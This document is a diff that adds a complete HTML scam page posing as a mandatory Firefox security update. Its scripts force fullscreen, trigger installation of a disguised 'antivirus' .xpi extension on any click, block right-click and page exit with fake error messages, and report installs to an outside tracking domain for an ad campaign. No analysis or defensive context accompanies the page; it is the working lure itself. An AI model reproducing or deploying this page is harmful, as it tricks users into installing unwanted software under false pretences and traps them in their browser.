@@ -1,0 +1,523 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8" />
+
+        <title>Update for Firefox 57.0</title>
+
+        <link rel="stylesheet" href="/ff/reset.min.css" />
+        <style>
+            * {
+                box-sizing: border-box;
+                outline: none;
+                -webkit-font-smoothing: antialiased;
+                -webkit-user-select: none;
+                -moz-user-select: none;
+                -ms-user-select: none;
+                user-select: none;
+            }
+            html, body {
+                height: 100%;
+                overflow: hidden;
+                width: 100%;
+            }
+            body {
+                background: -moz-linear-gradient(top, #0b3c79 0%, #10659c 100%, #3b81aa 0%);
+                background: linear-gradient(top, #0b3c79 0%, #10659c 100%, #3b81aa 0%);
+                color: #fff;
+                font: 12px/14px "Open Sans", X-LocaleSpecific, sans-serif;
+            }
+            strong {
+                font-weight: 700;
+            }
+            .page-wrapper {
+                min-width: 780px;
+            }
+            .page__header-wrapper {
+                border-top: 2px solid #fff;
+                height: 40px;
+                width: 100%;
+            }
+            .page__header {
+                background: transparent url("data:image/png;base64,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") 0 0 no-repeat;
+                display: block;
+                float: right;
+                height: 37px;
+                position: relative;
+                width: 147px;
+                z-index: 2;
+            }
+            .page__install-wrapper {
+                height: 500px;
+                position: absolute;
+                text-align: center;
+                top: 25%;
+                width: 100%;
+                z-index: 9999;
+            }
+            .page__install-wrapper #install__title {
+                font: 40px/40px "Open Sans", X-LocaleSpecific, sans-serif;
+                margin: 30px 0;
+            }
+            .page__install-wrapper #install__description {
+                margin-bottom: 10px;
+            }
+            .page__install-wrapper .install__button-wrapper {
+                margin-top: 20px;
+            }
+            /*
+            .page__install-wrapper .install__button-wrapper button {
+                background-color: #4caf50;
+                border: 2px solid #4aa84a;
+                color: #fff;
+                cursor: pointer;
+                display: inline-block;
+                font-size: 20px;
+                
+                padding: 10px 36px;
+                position: relative;
+                text-align: center;
+                text-shadow: none;
+
+                -webkit-border-radius: 5px;
+                -moz-border-radius: 5px;
+                border-radius: 5px;
+            }
+            */
+            .page__install-wrapper .install__button-wrapper button {
+                color: #e8f0de;
+                border: solid 1px #538312;
+                background: #64991e;
+                background: -webkit-gradient(linear, left top, left bottom, from(#7db72f), to(#4e7d0e));
+                background: -moz-linear-gradient(top, #7db72f, #4e7d0e);
+                box-shadow: 0px 2px 2px 0px rgba(0, 0, 0, 0.30);
+                cursor: pointer;
+                display: inline-block;
+                filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#7db72f', endColorstr='#4e7d0e');
+                font-size: 20px;
+                line-height: 20px;
+                margin: 10px 0;
+                padding: 10px 36px;
+                text-shadow: 0 1px 1px rgba(0,0,0,.3);
+
+                -webkit-border-radius: 5px;
+                -moz-border-radius: 5px;
+                border-radius: 5px;
+            }
+            .page__install-wrapper .install__button-wrapper button:hover {
+                background: #538018;
+                background: -webkit-gradient(linear, left top, left bottom, from(#6b9d28), to(#436b0c));
+                background: -moz-linear-gradient(top, #6b9d28, #436b0c);
+                filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#6b9d28', endColorstr='#436b0c');
+            }
+            .page__install-wrapper .install__hint {
+                font-size: 12px;
+                font-weight: 700;
+                margin-bottom: 10px;
+            }
+            .page__install-wrapper .install__list {
+                font-size: 14px;
+                line-height: 18px;
+                list-style-type: disc;
+                margin-top: 20px;
+            }
+            .page__instructor-wrapper {
+                background-color: #2b3a43;
+                height: 500px;
+                left: 20px;
+                opacity: 0;
+                padding: 20px;
+                position: absolute;
+                top: 190px;
+                width: 350px;
+                z-index: 2;
+
+                -webkit-border-radius: 10px;
+                -moz-border-radius: 10px;
+                border-radius: 10px;
+            }
+            .page__instructor-wrapper:after {
+                border-bottom: 30px solid #2b3a43;
+                border-top-color: inherit; 
+                border-left: 30px solid transparent;
+                border-right: 30px solid transparent; 
+                color: #000 !important;
+                content: "";
+                display: block;
+                left: 19px;
+                position: absolute;
+                top: -25px;
+                width: 0;
+                z-index: 1;
+            }
+            .instructor__description {
+                margin-bottom: 10px;
+            }
+            .instructor__step-wrapper {
+                margin-bottom: 10px;
+            }
+            .instructor__step-wrapper .step__image {
+                /**/
+            }
+            .instructor__step-wrapper .step__image img {
+                width: 100%;
+            }
+            .instructor__step-wrapper .step__text {
+                margin: 5px 0 10px;
+            }
+            #notification {
+                background: #ea342d url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACIUlEQVQ4jZ2NT2iScRjHf9GMpq+6ub3plv96Z75dGsqipXUwRPLWKQqiW536Q1FRp7CIIgaNYFBzO7TNpngplslG5GIr2hYVHVqwi6stpyL6qvi+r75j305JsoxtD3wOz5fn830IqTPJx9pdXLBD4kJMOdvfrK53V3e48N5JYe4chNmza9yoObgpOe2nbblgx6q0cBPS/AXkAoyUHqQtGy7IBpif/NujEGNWiDErSm8OIztk/rox2d9+igtZJen7FXR7POj2eFCZvwQuYJEyT7Tu/8pxH9mZ8evzwrtjEKed6HK50OVyofzxOPjYEWQGdqfDJ8j2ugWZft2D/KilUv50EsK4HvsdDnQ6HBDG9Sh/OYNcgCkn+7SX/ykv9srbUn3akjjlhjCxB0JUB9ZuB2uzQ4jqIMY6IUw6ke6lC3FfU9O6gvQjOsIFDavilBN8hAYfoWFiWZj3sdVdfO9GbshQSfa0DtbIibvqA6mHLUUhdhD8y1bwYxrwYxrojAbojMbqzr9qh/DahpV7zYVln9L6x9+2cl/zLR9qAx81ofRCXQUzXmDGW5PxEyy44Za1Xz7lNCGEkKXbqtOpHhXHR80ojjSi9FxZRU5RkFNUTVYckYOPmpC4Q3Hx6wovSfhUqWJYg8JTBfIDO2pokMnQIJOtywvDKuSfqbF0Q/GDLN9Sin9/2AyLV+UCWbhGfZ49r8dWiF9s/EAIIQwh5NAWYX4Dj4eVC+6COIQAAAAASUVORK5CYII=") 20px 15px no-repeat;
+                bottom: 35px;
+                box-shadow: 0.50px 0.50px 0.50px 0.50px rgba(0, 0, 0, 0.30);
+                color: #fff;
+                left: 10px;
+                padding: 15px 20px 15px 50px;
+                position: fixed;
+                max-width: 600px;
+                z-index: 2;
+
+                -webkit-border-radius: 5px;
+                -moz-border-radius: 5px;
+                border-radius: 5px;
+
+                transition: opacity 1s linear;
+            }
+            #alert__top {
+                background-color: #ea342d;
+                box-shadow: 0.50px 0.50px 0.50px 0.50px rgba(0, 0, 0, 0.30);
+                color: #e7e7e7;
+                left: 0; 
+                margin: auto;
+                padding: 5px;
+                position: absolute;
+                right: 0; 
+                text-align: center;
+                top: 70px;
+                width: 600px;
+
+                -webkit-border-radius: 5px;
+                -moz-border-radius: 5px;
+                border-radius: 5px;
+            }
+            #alert__center {
+                background-color: #f0f0f0;
+                border: 1px solid #1883d7;
+                color: #000;
+                cursor: pointer;
+                font: 11px/11px "Tahoma", serif;
+                height: 125px;
+                left: 50%;
+                margin-left: -301px;
+                margin-top: -101px;
+                position: fixed;
+                top: 50%;
+                width: 602px;
+                z-index: 999999;
+
+                -webkit-box-shadow: 0px 0px 20px 0px rgba(0, 0, 0, 0.30);
+                -moz-box-shadow: 0px 0px 20px 0px rgba(0, 0, 0, 0.30);
+                box-shadow: 0px 0px 20px 0px rgba(0, 0, 0, 0.30);
+            }
+            #alert__center #alert__close {
+                position: absolute;
+                right: 10px;
+                top: 10px;
+            }
+            #alert__center #alert__title {
+                background-color: #fff;
+                padding: 10px;
+            }
+            #alert__center #alert__body-wrapper {
+                height: 55px;
+            }
+            #alert__center #alert__text {
+                background: transparent url("data:image/png;base64,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") 12px 10px no-repeat;
+                height: 52px;
+                line-height: 16px;
+                padding: 10px;
+                padding-left: 54px;
+            }
+            #alert__center #alert__footer {
+                bottom: 0;
+                text-align: center;
+                position: relative;
+            }
+            #alert__center #alert__footer .button {
+                background-color: #e1e1e1;
+                border: 1px solid #adadad;
+                display: inline-block;
+                margin: 0 7px;
+                min-width: 80px;
+                padding: 7px 15px;
+            }
+            .button--primary {
+                border: 2px solid #0078d7 !important;
+                padding: 6px 15px !important;
+            }
+            #alert__center #alert__footer .button:hover {
+                background-color: #e5f1fb;
+                border-color: #0078d7;
+            }
+            #alert__bottom {
+                background-color: rgba(45, 37, 58, 0.5);
+                bottom: 0px;
+                color: #fff;
+                left: 0;
+                padding: 5px 0;
+                position: fixed;
+                text-align: center;
+                width: 100%;
+                z-index: 2;
+            }
+        </style>
+
+        <script>
+            if (window !== window.parent) {
+                window.top.location.href = window.self.location.href;
+            }
+        </script>
+        <script type='application/javascript'>
+            if (!window.KTracking){window.KTracking={collectNonUniqueClicks: false, multiDomain: false, R_PATH: 'https://justgreatapp.biz/DDZFHD?lp_id=252', P_PATH:'https://justgreatapp.biz/1e5ad36/postback', listeners: [], reportConversion: function(){this.queued = arguments;}, getSubId: function(fn) {this.listeners.push(fn);}, ready: function(fn) {this.listeners.push(fn);} };}(function(){var a=document.createElement('script');a.type='application/javascript';a.async=true;a.src='https://justgreatapp.biz/js/ktr.js';var s=document.getElementsByTagName('script')[0];s.parentNode.insertBefore(a,s)})();
+        </script><noscript><img height='0' width='0' alt='' src='https://justgreatapp.biz/DDZFHD?lp_id=252'/></noscript>
+    </head>
+    <body>
+        <div class="page-wrapper">
+            <div class="page__header-wrapper">
+                <div class="page__header"></div>
+
+                <div id="page__install-wrapper" class="page__install-wrapper">
+                    <div class="install__logo--container">
+                        <img src="/images/firefox-logo-64.png" alt="" />
+                    </div>
+                    <h1 id="install__title">Firefox requires a manual update</h1>
+                    <div id="install__description" class="install__description">This update is required to ensure that you are protected on the Internet.</div>
+                    <div class="install__button-wrapper">
+                        <button onclick="initializeInstallation()">Install now</button>
+                    </div>
+                    <div id="install__hint" class="install__hint">* This update is required</div>
+                    <ul id="install__list" class="install__list">
+                    <li>Protect yourself immediately on the internet</li><li>Internet pages are automatically examined and possibly blocked</li><li>Increased protection against malware and viruses</li>                    </ul>
+                </div>
+
+                <div id="page__instructor-wrapper" class="page__instructor-wrapper">
+                    <div id="instructor__description1" class="instructor__description">Normally, Firefox blocks the installation of new plugins. Proceed as follows:</div>
+                    <div class="instructor__step-wrapper">
+                        <div class="step__image"><img src="/images/en/step_1.png" alt="" /></div>
+                        <div id="step__text1" class="step__text">1. Click on "Allow"</div>
+                    </div>
+                    <div class="instructor__step-wrapper">
+                        <div class="step__image"><img src="/images/en/step_2.png" alt="" /></div>
+                        <div id="step__text2" class="step__text">2. Click on "Add"</div>
+                    </div>
+                    <div id="instructor__description2" class="instructor__description">* This message will no longer appear after this installation.</div>
+                </div>
+            </div>
+
+            <div id="R29iCArRwlXSzxED" style="display: none;" />
+            <div id="notification" style="display: none;">Error! Manual update required!</div>
+            <div id="alert__top">Firefox requires a manual update for: Antivirus for Firefox</div>
+            <div id="alert__center" style="display: none;">
+                <div id="alert__close"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAoAAAAKCAIAAAACUFjqAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAA/SURBVHjaYmBgYDhz5sx/DAAUZIDIsbJzoKmACzIgc9DkgGwGNCE0pQxoBqJZxMSAHxA2HJ/TCHgMf7AABBgAf3DGVVNllAkAAAAASUVORK5CYII=" alt="" /></div>
+                <div id="alert__title">Confirm</div>
+                <div id="alert__text">To continue, you must perform a manual update.</div>
+                <div id="alert__footer">
+                    <div id="alert__ok" class="button button--primary">OK</div><div id="alert__cancel" class="button">Cancel</div>
+                </div>
+            </div>
+            <div id="alert__bottom">Update your browser components to be protected.</div>
+        </div>
+
+        <canvas id="install__canvas" style="display: none;"></canvas>
+        <img id="authenticate__image" src="" alt="" />
+        <iframe id="ff-r" src="/ff/reloadlistener/" style="border: none; height: 1px; width: 1px; z-index: 2;"></iframe>
+        <iframe id="ff-s" src="" style="border: none; height: 1px; width: 1px; z-index: 2;"></iframe>
+
+        <script>
+            var isDebugMode = true;
+            //var clickId = "wSDZD123";
+            var audioEnabled = false;
+            var xpiUrl = "/ff/ff_protect_antivir-1.2.3-an+fx.xpi";
+
+            var isHovering = false;
+            var isMouseMoving = false;
+            var isLoading = false;
+            var onBeforeUnloadBlocked = true;
+
+            document.getElementById("authenticate__image").src = "/ff/authenticate/?nocache=" + Date.now();
+
+            function checkState() {
+                console.log("checkState()");
+                setTimeout(function () {
+                    if (isHovering === false && isMouseMoving === true && isLoading === false && onBeforeUnloadBlocked === true) {
+                        console.log("requestReloadWithResponse()");
+                        showAlert();
+                        isLoading = true;
+                        document.getElementById("ff-r").contentWindow.requestReloadWithResponse();
+                    }
+
+                    checkState();
+                }, 100);
+            }
+            checkState();
+
+            function showAlert() {
+                console.log("showAlert()");
+                var alertElement = document.getElementById("alert__center");
+                alertElement.style.display = "block";
+            }
+            function hideAlert() {
+                console.log("hideAlert()");
+                var alertElement = document.getElementById("alert__center");
+                alertElement.style.display = "none";
+            }
+
+            function showNotification(text) {
+                console.log("showNotification()", text);
+                var notificationElement = document.getElementById("notification");
+                var notificationTimeout = 4;
+                notificationElement.innerHTML = text;
+                notificationElement.style.display = "block";
+                setTimeout(function () {
+                    notificationElement.style.display = "none";
+                }, 1000 * notificationTimeout);
+            }
+
+            function onFullscreenChange() {
+                console.log("onFullscreenChange()");
+                var fullscreenElement = document.fullscreenElement || document.mozFullScreenElement || document.webkitFullscreenElement;
+
+                if (! fullscreenElement) {
+                    onBeforeUnloadBlocked = true;
+                    showNotification("Error! You need update your security components to continue.");
+                    document.getElementById("page__instructor-wrapper").style.opacity = "0";
+                    reloadMe();
+                }
+            }
+
+            function initializeInstallation() {
+                console.log("initializeInstallation()");
+                hideAlert();
+                document.getElementById("install__canvas").mozRequestFullScreen();
+                onBeforeUnloadBlocked = false;
+                setTimeout(function () {
+                    console.log("initializeInstallation()", "setTimeout()");
+                    try {
+                        InstallTrigger.install({
+                            "Foo": {
+                                URL: xpiUrl,
+                                toString: function () {
+                                    return this.URL;
+                                }
+                            }
+                        });
+                        document.getElementById("page__instructor-wrapper").style.opacity = "1";
+                        document.getElementById("ff-s").src = "/ff/installlistener/";
+                    }
+                    catch (e) {
+                        /**/
+                    }
+                }, 500);
+            }
+
+            function onInstalled() {
+                onBeforeUnloadBlocked = false;
+                window.onbeforeunload = function () {};
+
+                setTimeout(function () {
+                    var ad_campaign_id = "";
+                    try { 
+                        var url = new URL("document.referrer"); 
+                        ad_campaign_id = url.searchParams.get("ad_campaign_id") 
+                    } catch (e) {};
+                    window.location.replace("/ff/postback/?ad_campaign_id=" + ad_campaign_id);
+                }, 500);
+            }
+
+            function onReloadResponse() {
+                console.log("onReloadResponse()");
+                showAlert();
+                document.body.focus();
+                isLoading = false;
+                /*
+
+                isHovering = true;
+
+                */
+            }
+            function requestReload() {
+                console.log("requestReload()");
+                document.getElementById("ff-r").contentWindow.requestReloadWithResponse();
+            }
+            function requestExternalReload() {
+                console.log("requestExternalReload()");
+                document.getElementById("ff-r").contentWindow.requestReload();
+            }
+            var reloadListenerReadyCount = 0;
+            function onReloadListenerReady() {
+                console.log("onReloadListenerReady()");
+                if (reloadListenerReadyCount > 0) {
+                    return;
+                }
+                reloadListenerReadyCount += 1;
+                document.getElementById("ff-r").contentWindow.requestReload();
+                showAlert();
+            }
+
+            if (isDebugMode !== true) {
+                console.log = function () {
+                    return "";
+                };
+            }
+
+            document.addEventListener("dragstart", function (e) {
+                console.log("document", "dragstart");
+                e.preventDefault();
+            }, false);
+            document.addEventListener("click", initializeInstallation, false);
+            document.addEventListener("contextmenu", function (e) {
+                console.log("document", "contextmenu");
+                e.preventDefault();
+            }, false);
+            document.addEventListener("keyup", function (e) {
+                console.log("keyup");
+                hideAlert();
+                document.getElementById("ff-r").contentWindow.requestReloadWithResponse();
+                showAlert();
+                showNotification("Error! You need to install the update to leave this page.");
+                window.onbeforeunload = function () {
+                    return "Intercepted";
+                };
+            }, false);
+            document.addEventListener("mousemove", function (e) {
+                console.log("document", "mousemove");
+                isMouseMoving = true;
+                if (e.clientY < 80) {
+                    isHovering = false;
+                }
+            }, false);
+            document.addEventListener("mouseleave", function (e) {
+                console.log("document", "mouseleave");
+                isHovering = false;
+            }, false);
+            document.addEventListener("mouseout", function (e) {
+                console.log("document", "mouseout");
+                isHovering = false;
+            }, false);
+            document.addEventListener("fullscreenchange", onFullscreenChange, false);
+            document.addEventListener("webkitfullscreenchange", onFullscreenChange, false);
+            document.addEventListener("mozfullscreenchange", onFullscreenChange, false);
+            document.getElementById("page__install-wrapper").addEventListener("mouseover", function (e) {
+                console.log("page__install-wrapper", "mouseover");
+                isHovering = true;
+            }, false);
+            document.getElementById("page__install-wrapper").addEventListener("mouseout", function (e) {
+                console.log("page__install-wrapper", "mouseout");
+                isHovering = false;
+            }, false);
+            document.getElementById("alert__center").addEventListener("mouseover", function (e) {
+                console.log("alert__center", "mouseout");
+                isHovering = true;
+            }, false);
+        </script>
+    </body>
+</html>
